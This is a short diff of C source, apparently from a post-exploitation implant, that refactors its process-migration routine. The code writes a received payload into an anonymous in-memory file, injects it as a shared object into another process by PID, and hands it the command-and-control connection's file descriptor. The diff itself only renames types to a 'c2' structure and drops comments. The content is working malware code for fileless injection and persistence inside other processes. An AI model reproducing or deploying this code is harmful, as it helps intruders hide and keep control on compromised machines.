@@ -31,14 +31,10 @@
 
 #include <injector.h>
 
-#include <tlv.h>
+#include <c2.h>
 #include <migrate.h>
 
-/*
- * Perform reading from socket for further migration.
- */
-
-int migrate_init(tlv_pkt_t *tlv_pkt, pid_t migrate_pid, int buffer_len, unsigned char *buffer)
+int migrate_init(c2_t *c2, pid_t migrate_pid, int buffer_len, unsigned char *buffer)
 {
     #ifdef LINUX
     int fd = syscall(SYS_memfd_create, "", MFD_CLOEXEC);
@@ -50,7 +46,7 @@ int migrate_init(tlv_pkt_t *tlv_pkt, pid_t migrate_pid, int buffer_len, unsigned
         char image[PATH_MAX];
         sprintf(image, "/proc/self/fd/%d", fd);
 
-        migrate_inject(tlv_pkt, migrate_pid, image);
+        migrate_inject(c2, migrate_pid, image);
         return 0;
     }
     #endif
@@ -58,11 +54,7 @@ int migrate_init(tlv_pkt_t *tlv_pkt, pid_t migrate_pid, int buffer_len, unsigned
     return -1;
 }
 
-/*
- * Inject shared object.
- */
-
-int migrate_inject(tlv_pkt_t *tlv_pkt, pid_t migrate_pid, char *image)
+int migrate_inject(c2_t *c2, pid_t migrate_pid, char *image)
 {
     injector_t *injector;
     void *handle = NULL;
@@ -73,7 +65,7 @@ int migrate_inject(tlv_pkt_t *tlv_pkt, pid_t migrate_pid, char *image)
     if (injector_inject(injector, image, &handle) != 0)
         return -1;
 
-    if (injector_call(injector, handle, "init", tlv_pkt->channel) != 0)
+    if (injector_call(injector, handle, "init", c2->fd) != 0)
         return -1;
 
     injector_detach(injector);
